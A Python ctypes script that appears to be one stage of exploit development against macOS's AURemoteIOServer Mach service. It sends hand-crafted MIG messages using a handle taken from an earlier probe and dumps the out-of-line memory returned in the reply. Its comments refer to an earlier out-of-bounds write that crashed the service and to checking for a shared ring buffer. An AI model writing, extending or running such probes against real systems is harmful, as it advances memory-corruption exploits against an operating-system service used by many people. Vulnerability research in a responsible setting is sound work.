import ctypes as C, struct

# Run after surface_c_probe_a.py. Paste nc_hndl from its output below.
# Run when memory < 1250 MB.

NC_HNDL = 0xDEAD  # <-- replace with value from probe_a output

if NC_HNDL == 0xDEAD:
    print("BAIL: set NC_HNDL from probe_a output")
    raise SystemExit(1)

L = C.CDLL('/usr/lib/libSystem.B.dylib')
L.mach_task_self.restype = C.c_uint32

L.bootstrap_look_up.argtypes = [C.c_uint32, C.c_char_p, C.POINTER(C.c_uint32)]
L.bootstrap_look_up.restype = C.c_int32
L.mach_reply_port.restype = C.c_uint32
L.mach_msg.restype = C.c_int32
L.mach_msg.argtypes = [C.c_void_p, C.c_uint32, C.c_uint32, C.c_uint32,
                        C.c_uint32, C.c_uint32, C.c_uint32]

bs = C.c_uint32.in_dll(L, "bootstrap_port").value
svc = C.c_uint32(0)
kr = L.bootstrap_look_up(bs, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
print(f"svc_lookup kr={kr} port={svc.value}")
if kr != 0 or svc.value == 0: raise SystemExit(1)

rp = L.mach_reply_port()

COMPLEX = 0x80000000
SO_BITS = (0x14 << 8) | 0x13

# === Stage 4: Initialize (msg_id 0x157c3) ===
ASBD = struct.pack('<dIIIIIIII',
    44100.0, 0x6C70636D, 0x2C, 4, 1, 4, 1, 32, 0)
assert len(ASBD) == 40

buf2 = bytearray(0x200)
struct.pack_into('<IIIIII', buf2, 0x00,
    SO_BITS, 0x78, svc.value, rp, 0, 0x157c3)
struct.pack_into('<I', buf2, 0x20, NC_HNDL)
buf2[0x28:0x50] = ASBD
buf2[0x50:0x78] = ASBD

buf2_c = (C.c_uint8 * len(buf2)).from_buffer(buf2)
kr = L.mach_msg(buf2_c, 0x103, 0x78, len(buf2), rp, 8000, 0)
print(f"Initialize mach_msg kr={kr:#010x}")
if kr != 0: raise SystemExit(1)

in_bits = struct.unpack_from('<I', buf2, 0)[0]
in_size = struct.unpack_from('<I', buf2, 4)[0]
in_dcnt = struct.unpack_from('<I', buf2, 0x18)[0]
is_cmplx = bool(in_bits & COMPLEX)
print(f"  reply: bits={in_bits:#x} size={in_size} complex={is_cmplx} descs={in_dcnt}")

if not is_cmplx:
    in_ret = struct.unpack_from('<i', buf2, 0x20)[0]
    print(f"  non-complex (failure) ret={in_ret:#010x}")
    print("  if ret=MIG_BAD_ID(0x10004003) try msg_id 0x157c2 or check session_handle field offset")
    raise SystemExit(1)

# === Stage 5: Parse OOL descriptors ===
# 64-bit OOL descriptor: [0..7] addr, [8..11] flags, [12..15] size
# Shadow ne check: if server used our ne as ring buffer, OOL[0][0] == 0xAB
for i in range(in_dcnt):
    off   = 0x1c + i * 16
    addr  = struct.unpack_from('<Q', buf2, off)[0]
    flags = struct.unpack_from('<I', buf2, off + 8)[0]
    sz    = struct.unpack_from('<I', buf2, off + 12)[0]
    dealloc = flags & 0xFF
    copy_op = (flags >> 8) & 0xFF
    dtype   = (flags >> 24) & 0xFF
    print(f"  OOL[{i}]: addr={hex(addr)} sz={hex(sz)} dealloc={dealloc} copy={copy_op} type={dtype}")
    if addr and sz:
        view = (C.c_uint8 * min(64, sz)).from_address(addr)
        data = bytes(view)
        print(f"    data: {data.hex()}")
        # 0xAB marker removed from probe_a (OOB write caused SIGSEGV crash)
        # Verification: if OOL[0].data is all zeros, ring buffer is fresh (expected)
        all_zero = all(b == 0 for b in data)
        print(f"    all_zero={all_zero} data[0]={hex(data[0])}")

print("DONE")
